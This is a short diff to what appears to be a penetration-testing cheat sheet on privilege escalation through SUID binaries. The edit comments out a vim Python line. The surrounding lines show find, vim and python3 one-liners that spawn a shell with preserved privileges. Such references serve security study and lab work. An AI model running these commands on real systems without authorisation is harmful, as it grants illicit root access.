@@ -109,7 +109,7 @@ find . -exec /bin/sh -p \;
 # SUID vim -- spawn shell from within vim
 vim -c ':!/bin/sh'
 # Or inside vim:
-:py3 import os; os.execl('/bin/sh', 'sh', '-p')
+# :py3 import os; os.execl('/bin/sh', 'sh', '-p')  (run inside vim)
 
 # SUID python/python3
 python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
